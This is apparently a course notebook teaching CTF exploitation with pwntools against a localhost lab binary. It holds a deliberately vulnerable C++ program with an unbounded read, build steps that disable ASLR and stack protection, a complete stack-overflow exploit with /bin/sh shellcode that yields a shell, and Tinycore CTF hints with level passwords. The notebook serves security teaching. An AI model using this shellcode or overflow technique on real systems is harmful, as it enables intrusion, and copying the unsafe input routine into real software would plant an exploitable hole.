{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Capture The Flag (CTF)\n",
    "\n",
    "- How the Best Hackers Learn Their Craft: [Watch YouTube](https://www.youtube.com/watch?v=6vj96QetfTg&t=214s&ab_channel=RSAConference)\n",
    "- CTF Handbook - https://ctf101.org/\n",
    "\n",
    "## online CTF\n",
    "- Learn CTF - https://ctflearn.com/\n",
    "- PicoCTF - https://picoctf.org/\n",
    "\n",
    "## pwntools and CTF\n",
    "- pwntools is designed for quick exploitation in CTF environments\n",
    "- most CTF environments use client-server architecture\n",
    "    - flag is on the server\n",
    "    - you interact to the server from a remote client\n",
    "    - exploit the server program and capture the flag (CTF)\n",
    "    \n",
    "- you can easily create a server using netcat (nc) program in listening mode\n",
    "- you can also execute a binary/program when client connects to it\n",
    "- let's look into the `demos/ctf/basic` folder that tries to simulate the CTF-like environment\n",
    "- we'll use the `demos/ctf/basic/vuln.cpp` program to demonstrate how **pwntools** framework can be used to create a CTF-like challenge\n",
    "- a good YouTube video on Pwn Template and Input / Output is found here: https://www.youtube.com/watch?v=NhNbivMVPk0&ab_channel=ChristopherSchafer](https://www.youtube.com/watch?v=NhNbivMVPk0&ab_channel=ChristopherSchafer)\n",
    "\n",
    "## Netcat (nc)\n",
    "- https://en.wikipedia.org/wiki/Netcat\n",
    "- https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf\n",
    "- `nc` - networking utility for reading from and writing to network connections using TCP or UDP\n",
    "- can be very useful to transfer file between computers with limited resources"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/Sp25/SoftwareSecurity/notebooks\r\n"
     ]
    }
   ],
   "source": [
    "!pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/Sp25/SoftwareSecurity/demos/ctf/basic\n"
     ]
    }
   ],
   "source": [
    "%cd ../demos/ctf/basic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 40\r\n",
      "drwxr-xr-x 2 kali kali 4096 Jan 27 15:10 .\r\n",
      "drwxr-xr-x 6 kali kali 4096 Jan 27 15:10 ..\r\n",
      "-rw-r--r-- 1 kali kali 2318 Jan 27 15:10 exploit_demo.py\r\n",
      "-rw-r--r-- 1 kali kali 1334 Jan 27 15:10 exploit_getoffset.py\r\n",
      "-rwxr-xr-x 1 kali kali 1898 Jan 27 15:10 exploit.py\r\n",
      "-rw-r--r-- 1 kali kali 2576 Jan 27 15:10 exploit_vuln.py\r\n",
      "-rw-r--r-- 1 kali kali   27 Jan 27 15:10 flag.txt\r\n",
      "-rw-r--r-- 1 kali kali 1054 Jan 27 15:10 Makefile\r\n",
      "-rw-r--r-- 1 kali kali  116 Jan 27 15:10 netcat-loop.sh\r\n",
      "-rw-r--r-- 1 kali kali 1109 Jan 27 15:10 vuln.cpp\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/types.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <iostream>\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void give_shell(){\r\n",
      "    system(\"/bin/sh\");\r\n",
      "}\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    int ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t') )\r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (true) {\r\n",
      "        ch = getchar();\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    }\r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    cout << \"Give me some text: \";\r\n",
      "    fflush(stdout);\r\n",
      "    mgets(buffer); // similar to C's gets;\r\n",
      "    //gets(buffer); // depricated in C++\r\n",
      "    cout << \"Acknowledged: \" << buffer << \" with length \" << strlen(buffer) << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat vuln.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### compile and run as a server\n",
    "\n",
    "- `make` command must be run as sudo, as the Makefile also disables randomize_va_space\n",
    "- inorder to use `Makefile` and the Python exploit code easily, we'll change the working directory to ctf-demos/basic\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/SoftwareSecurity]\n",
    "└─$ cd ctf/basic \n",
    "- must run make with sudo to disable randomaize_va_space\n",
    "\n",
    "┌──(kali㉿K)-[~/SoftwareSecurity/ctf/basic]\n",
    "└─$ sudo make       \n",
    "[sudo] password for kali: \n",
    "# must run make with sudo to disable randomaize_va_space\n",
    "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
    "0\n",
    "g++ -g -Wall -m32 -fno-stack-protector -z execstack -no-pie vuln.cpp  -o vuln.exe \n",
    "\n",
    "```\n",
    "\n",
    "- let's make sure the target binary vuln.exe doesn't have any security controls in place to prevent overflow exploitation\n",
    "- we can use pwntools **checksec** command\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ pwn checksec vuln.exe                            \n",
    "[*] Checking for new versions of pwntools\n",
    "    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.8/update to 'never' (old way).\n",
    "    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):\n",
    "        [update]\n",
    "        interval=never\n",
    "[*] You have the latest version of Pwntools (4.3.1)\n",
    "[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "\n",
    "```\n",
    "\n",
    "- you can follow the instruction shown to never check for the pwntools update\n",
    "\n",
    "- make sure the nc server is listening on localhost port 1234 to run vuln.exe on client's connection\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ nc -v -l 127.0.0.1 -p 1234 -e vuln.exe\n",
    "listening on [any] 1234 ...\n",
    "connect to [127.0.0.1] from localhost [127.0.0.1] 38332\n",
    "\n",
    "```\n",
    "\n",
    "- open another terminal and run netcat to connect to the server \n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ nc localhost 1234                                \n",
    "buffer is at 0xffffc360\n",
    "Give me some text: sdf\n",
    "Acknowledged: sdf with length 3\n",
    "Good bye!\n",
    "```\n",
    "\n",
    "- NOTE that when the netcat server finished executing the vuln.exe program upon client's connection, the server then stops\n",
    "- you'll have to manually run the netcat server again inorder to interact from a client again...\n",
    "- this can be annoying as we'll have to interact with the vulnerable program many times\n",
    "- the following bash script comes to our rescue!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /bin/bash\r\n",
      "\r\n",
      "# script to run netcat server in a loop\r\n",
      "\r\n",
      "while true\r\n",
      "do\r\n",
      "    nc -v -l 127.0.0.1 -p 1234 -e vuln.exe\r\n",
      "done"
     ]
    }
   ],
   "source": [
    "! cat netcat-loop.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- from one terminal, run the bash script, so server is listening indefinitely one clinet after another\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ bash netcat-loop.sh \n",
    "listening on [any] 1234 ...\n",
    "\n",
    "connect to [127.0.0.1] from localhost [127.0.0.1] 38336\n",
    "listening on [any] 1234 ...\n",
    "connect to [127.0.0.1] from localhost [127.0.0.1] 38340\n",
    "listening on [any] 1234 ...\n",
    "```\n",
    "\n",
    "- from another terminal, continously connect to the server without having to rerun the server!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ nc localhost 1234                                \n",
    "buffer is at 0xffffc360\n",
    "Give me some text: sdf\n",
    "Acknowledged: sdf with length 3\n",
    "Good bye!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote CTF Demo\n",
    "- use `pwntools` to create a exploit code template\n",
    "- to create exploit template, we need the following:\n",
    "    - name of the target program\n",
    "    - ip of the host the binary will be running on (use 127.0.0.1 loopback for localhost as in this demo)\n",
    "    - the port number the server is listening on (pick unuser higher port numbers (above 1024)\n",
    "    - for online CTF, provide the server's IP and port typically provided to the contestents\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/EthicalHacking/demos/ctf$ pwn template ./vuln.exe --host localhost --port 1234 > exploit.py\n",
    "```\n",
    "\n",
    "- the generated `exploit.py` file provides a lot of boiler-plate code:\n",
    "    - for automatically detecting architecture of the target program\n",
    "    - stdio framework to interact with the target program locally\n",
    "        - locally meaning accessing program.exe directly from a terminal\n",
    "        - remotely meaning accessing a host via tcp/ip (ip:port)\n",
    "        - the same code works without little or no modification locally and remotely\n",
    "    - debug feature to display hexdump of stdio\n",
    "    - feature to generate the shellcode, etc.\n",
    "\n",
    "- let's look at the content of the `exploit.py`\n",
    "\n",
    "```python\n",
    "#!/usr/bin/env python\n",
    "# -*- coding: utf-8 -*-\n",
    "# This exploit template was generated via:\n",
    "# $ pwn template ./vuln.exe --host 127.0.0.1 --port 1234\n",
    "from pwn import *\n",
    "\n",
    "# Set up pwntools for the correct architecture\n",
    "exe = context.binary = ELF('./vuln.exe')\n",
    "\n",
    "# Many built-in settings can be controlled on the command-line and show up\n",
    "# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n",
    "# for all created processes...\n",
    "# ./exploit.py DEBUG NOASLR\n",
    "# ./exploit.py GDB HOST=example.com PORT=4141\n",
    "host = args.HOST or '127.0.0.1'\n",
    "port = int(args.PORT or 1234)\n",
    "\n",
    "def local(argv=[], *a, **kw):\n",
    "    '''Execute the target binary locally'''\n",
    "    if args.GDB:\n",
    "        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n",
    "    else:\n",
    "        return process([exe.path] + argv, *a, **kw)\n",
    "\n",
    "def remote(argv=[], *a, **kw):\n",
    "    '''Connect to the process on the remote host'''\n",
    "    io = connect(host, port)\n",
    "    if args.GDB:\n",
    "        gdb.attach(io, gdbscript=gdbscript)\n",
    "    return io\n",
    "\n",
    "def start(argv=[], *a, **kw):\n",
    "    '''Start the exploit against the target.'''\n",
    "    if args.LOCAL:\n",
    "        return local(argv, *a, **kw)\n",
    "    else:\n",
    "        return remote(argv, *a, **kw)\n",
    "\n",
    "# Specify your GDB script here for debugging\n",
    "# GDB will be launched if the exploit is run via e.g.\n",
    "# ./exploit.py GDB\n",
    "gdbscript = '''\n",
    "tbreak main\n",
    "continue\n",
    "'''.format(**locals())\n",
    "\n",
    "#===========================================================\n",
    "#                    EXPLOIT GOES HERE\n",
    "#===========================================================\n",
    "# Arch:     i386-32-little\n",
    "# RELRO:    Partial RELRO\n",
    "# Stack:    No canary found\n",
    "# NX:       NX disabled\n",
    "# PIE:      No PIE (0x8048000)\n",
    "# RWX:      Has RWX segments\n",
    "\n",
    "io = start()\n",
    "\n",
    "# shellcode = asm(shellcraft.sh())\n",
    "# payload = fit({\n",
    "#     32: 0xdeadbeef,\n",
    "#     'iaaa': [1, 2, 'Hello', 3]\n",
    "# }, length=128)\n",
    "# io.send(payload)\n",
    "# flag = io.recv(...)\n",
    "# log.success(flag)\n",
    "\n",
    "io.interactive()\n",
    "\n",
    "```\n",
    "\n",
    "- now let's do a quick test of the exploit code\n",
    "- make sure the nc server is listening on localhost port 1234 to run vuln.exe on connection\n",
    "- use the `netcat-loop.sh` script to run server in the loop\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ bash netcat-loop.sh \n",
    "listening on [any] 1234 ...\n",
    "```\n",
    "\n",
    "- open another terminal and run the exploit code exploit.py \n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ python exploit.py\n",
    "[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "[+] Opening connection to localhost on port 1234: Done\n",
    "[*] Switching to interactive mode\n",
    "buffer is at 0xffffc360\n",
    "Give me some text: $ do you copy this?\n",
    "Acknowledged: do you copy this? with length 17\n",
    "Good bye!\n",
    "[*] Got EOF while reading in interactive\n",
    "$ \n",
    "$ \n",
    "[*] Closed connection to localhost port 1234\n",
    "[*] Got EOF while sending in interactive\n",
    "```\n",
    "\n",
    "### Update Exploit code\n",
    "- the vulnerable program is exactly the same as the stack_overflow/so_stdio.cpp\n",
    "- the exploit code is also exactly the same as a result to send and execute shellcode from the vulnerable program's stack\n",
    "- let's look at the updated exploit code `exploit_vuln.py` file\n",
    "\n",
    "### Find offset of buffer\n",
    "- run the `exploit_getoffset.py` script to automatically run the binary locally, crash and find the offset from coredump\n",
    "- you can also use `gdb-peda`\n",
    "- offset is same locally or remotely as long as the the program is run on the same architecture\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ python exploit_getoffset.py                                                          1 ⨯ 1 ⚙\n",
    "[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "[+] Starting local process '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe': pid 11262\n",
    "[*] Process '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe' stopped with exit code -11 (SIGSEGV) (pid 11262)\n",
    "[+] Parsing corefile...: Done\n",
    "[*] '/home/kali/EthicalHacking/ctf-demos/basic/core.11262'\n",
    "    Arch:      i386-32-little\n",
    "    EIP:       0x61616161\n",
    "    ESP:       0xffffc3a0\n",
    "    Exe:       '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe' (0x8049000)\n",
    "    Fault:     0x61616161\n",
    "offset = 144\n",
    "```\n",
    "- use the offset to generate and send the payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/usr/bin/env python\r\n",
      "# -*- coding: utf-8 -*-\r\n",
      "# This exploit template was generated via:\r\n",
      "# $ pwn template ./vuln.exe --host 127.0.0.1 --port 1234\r\n",
      "from pwn import *\r\n",
      "\r\n",
      "# Set up pwntools for the correct architecture\r\n",
      "exe = context.binary = ELF('./vuln.exe')\r\n",
      "\r\n",
      "# Many built-in settings can be controlled on the command-line and show up\r\n",
      "# in \"args\".  For example, to dump all data sent/received, and disable ASLR\r\n",
      "# for all created processes...\r\n",
      "# ./exploit.py DEBUG NOASLR\r\n",
      "# ./exploit.py GDB HOST=example.com PORT=4141\r\n",
      "host = args.HOST or '127.0.0.1'\r\n",
      "port = int(args.PORT or 1234)\r\n",
      "\r\n",
      "def local(argv=[], *a, **kw):\r\n",
      "    '''Execute the target binary locally'''\r\n",
      "    if args.GDB:\r\n",
      "        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\r\n",
      "    else:\r\n",
      "        return process([exe.path] + argv, *a, **kw)\r\n",
      "\r\n",
      "def remote(argv=[], *a, **kw):\r\n",
      "    '''Connect to the process on the remote host'''\r\n",
      "    io = connect(host, port)\r\n",
      "    if args.GDB:\r\n",
      "        gdb.attach(io, gdbscript=gdbscript)\r\n",
      "    return io\r\n",
      "\r\n",
      "def start(argv=[], *a, **kw):\r\n",
      "    '''Start the exploit against the target.'''\r\n",
      "    if args.LOCAL:\r\n",
      "        return local(argv, *a, **kw)\r\n",
      "    else:\r\n",
      "        return remote(argv, *a, **kw)\r\n",
      "\r\n",
      "# Specify your GDB script here for debugging\r\n",
      "# GDB will be launched if the exploit is run via e.g.\r\n",
      "# ./exploit.py GDB\r\n",
      "gdbscript = '''\r\n",
      "tbreak main\r\n",
      "continue\r\n",
      "'''.format(**locals())\r\n",
      "\r\n",
      "#===========================================================\r\n",
      "#                    EXPLOIT GOES HERE\r\n",
      "#===========================================================\r\n",
      "# Arch:     i386-32-little\r\n",
      "# RELRO:    Partial RELRO\r\n",
      "# Stack:    No canary found\r\n",
      "# NX:       NX disabled\r\n",
      "# PIE:      No PIE (0x8048000)\r\n",
      "# RWX:      Has RWX segments\r\n",
      "\r\n",
      "offset = 144\r\n",
      "# open next tube\r\n",
      "io = start()\r\n",
      "\r\n",
      "# Find the base address of buffer\r\n",
      "# base address is printed to stdout; just grab it\r\n",
      "io.recvuntil(' at ')\r\n",
      "address = int(io.recvline(False), 16)\r\n",
      "repeat_ret_address = p32(address)*5\r\n",
      "\r\n",
      "# get the shellcode\r\n",
      "#shellcode_user = asm(shellcraft.i386.linux.sh()) # this didn't work!\r\n",
      "\r\n",
      "# x86/linux/exec: 24 bytes; copied from shellcode/x86-linux-sh.py file\r\n",
      "\r\n",
      "shellcode_user = (\r\n",
      "    b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\r\n",
      "    b\"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"\r\n",
      ")\r\n",
      "\r\n",
      "sled_len = offset - len(repeat_ret_address)-len(shellcode_user)\r\n",
      "NOPSled = b'\\x90'*sled_len # asm('nop')\r\n",
      "io.sendline(NOPSled+shellcode_user+repeat_ret_address)\r\n",
      "\r\n",
      "# shellcode = asm(shellcraft.sh())\r\n",
      "# payload = fit({\r\n",
      "#     32: 0xdeadbeef,\r\n",
      "#     'iaaa': [1, 2, 'Hello', 3]\r\n",
      "# }, length=128)\r\n",
      "# io.send(payload)\r\n",
      "# flag = io.recv(...)\r\n",
      "# log.success(flag)\r\n",
      "\r\n",
      "# get shell\r\n",
      "io.interactive()\r\n"
     ]
    }
   ],
   "source": [
    "! cat exploit_vuln.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the updated exploit code\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/ctf-demos/basic]\n",
    "└─$ python exploit_vuln.py                                                               1 ⨯ 1 ⚙\n",
    "[*] '/home/kali/EthicalHacking/ctf-demos/basic/vuln.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "[+] Opening connection to 127.0.0.1 on port 1234: Done\n",
    "b'Give me some text: Acknowledged: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe31\\xc9\\x89\\xcaj\\x0bX\\xcd\\x80`\\xc3\\xff\\xff`\\xc3\\xff\\xff`\\xc3\\xff\\xff`\\xc3\\xff\\xff`\\xc3\\xff\\xff with length 144\\n'\n",
    "[*] Switching to interactive mode\n",
    "$ \n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Tue Dec 29 15:40:46 MST 2020\n",
    "$  \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run Python exploit with arguments\n",
    "\n",
    "```bash\n",
    "$ python exploit_vuln.py LOCAL\n",
    "$ python exploit_vuln.py HOST=127.0.0.1 PORT=1234\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Invoking libc functions in Python\n",
    "- need https://docs.python.org/3/library/ctypes.html\n",
    "\n",
    "## Find local libc.so file\n",
    "- one way to do that is using `ldd` command along with a C/C++ binary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ldd: ./demo.exe: No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "! ldd demo.exe\n",
    "# see libc.so.6 file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "from ctypes import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# invoke a C function in Python\n",
    "libc = cdll.LoadLibrary(\"libc.so.6\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "libc.printf(b\"Hello!\\n\")\n",
    "# actual output is not seen on Jupyter notebook... only shows the no. of bytes printed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /usr/bin/env python3\r\n",
      "\r\n",
      "# how to invoke C function in Python\r\n",
      "from ctypes import *\r\n",
      "libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")\r\n",
      "libc.printf(b\"Hello World\\n\")\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# run script file instead\n",
    "! cat ../rop1/libc.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World\r\n"
     ]
    }
   ],
   "source": [
    "# run script instead\n",
    "! python ../rop1/libc.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tinycore Capture The Flag (CTF)\n",
    "- Download and install as a VM: - https://ctf-o-matic.github.io/capture-the-flag/\n",
    "- Based on Strip CTF: https://stripe.com/blog/capture-the-flag\n",
    "- Level 5 readme correction:\n",
    "    - Webservice is running at port 8005 not at 9020 as the motd.txt description says\n",
    "    - `$curl localhost:8005 -d \"hello there\"`\n",
    "- Hints: https://github.com/dividuum/stripe-ctf\n",
    "- Learn about Tinycore Linux: [http://tinycorelinux.net/intro.html](http://tinycorelinux.net/intro.html)\n",
    "- Has 6 levels\n",
    "\n",
    "### level00@box has two files: motd.txt and tools.txt\n",
    "- cat tools.txt to get some general ideas about the tools and technqiues\n",
    "- motd.txt describes about TinyCore CTF and the information on what to do to get to the next level\n",
    "\n",
    "### Installing apps and tools - Use Tiny Core Extension: Application Browser\n",
    "- Let's say you want to install gcc; first switch to `tc` user\n",
    "```bash\n",
    "$ su tc\n",
    "$ tce \n",
    "```\n",
    "- search for: compile\n",
    "- install compiletc package which installs everything to compile using gcc\n",
    "\n",
    "### Now compile level01.c program\n",
    "- how to edit? Use vi or nano\n",
    "- or locally edit and upload using Netcat\n",
    "- TinyCoreCTF doens't have GUI to work with files so one can send files back-and-forth to a GUI supported Linux environment\n",
    "    - if you want to send file to TinyCore do the following:\n",
    "    - on Tinycore run netcat in listening mode:\n",
    "        - `$ nc -v -l -p [port] > filename` \n",
    "    - from Kali Linux send a file:\n",
    "        - `$ cat file | nc -v [tinycoreIP] [tinycorePort]`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hints\n",
    "- see all the levels\n",
    "```bash\n",
    "$ cd /levels\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### level00\n",
    "- nothing to do here; but just be familiar with the CTF\n",
    "- password (izeecahd) is in /home/level00/.password\n",
    "```bash\n",
    "$ cd /levels/level00\n",
    "$ cat /home/level00/.password\n",
    "```\n",
    "- this folder is empty"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### level01\n",
    "- create a program that can read the password/flag for level01 user\n",
    "- use levels/level01 files to make it happen\n",
    "- password (aepeefoo) is in /home/level01/.password\n",
    "- see the contents of level01\n",
    "```bash\n",
    "$ cd /levels/level01/\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### level02\n",
    "- web-based vulnerability\n",
    "- password (quemaosh) is in /home/level02/.password file\n",
    "- force the webserver to read the password file and display the content as response\n",
    "- see the contents of /levels/level02/ folder\n",
    "```bash\n",
    "$ curl http://localhost:8002\n",
    "$ less /levels/level02/level02.py\n",
    "$ curl --cookie \"some_cookie=value\" http://localhost:8002\n",
    "```\n",
    "- can use browser from host to interact with the form\n",
    "- http://[ip]:8002/\n",
    "- use cookie editor plugin for chrome or proxy tool such as owasp zap or burpuite that come with Kali"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### level03\n",
    "- password (eingaima) for level03 is in /home/level03/.password file\n",
    "- files in /levels/level03 may be useful\n",
    "- binary level03 provides some functionalites to work with some string\n",
    "\n",
    "```bash\n",
    "$ cd /levels/level03\n",
    "$ ls\n",
    "$ ./level03\n",
    "$ ./level03 0 \"hello world\"\n",
    "\n",
    "```\n",
    "- negative index?\n",
    "- carefully read level03.c file\n",
    "- fns is array of function addresses, find the offset of depricated run function\n",
    "- pass it with proper offset to get the run function to execute\n",
    "- use gdb or write a script to bruteforce it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
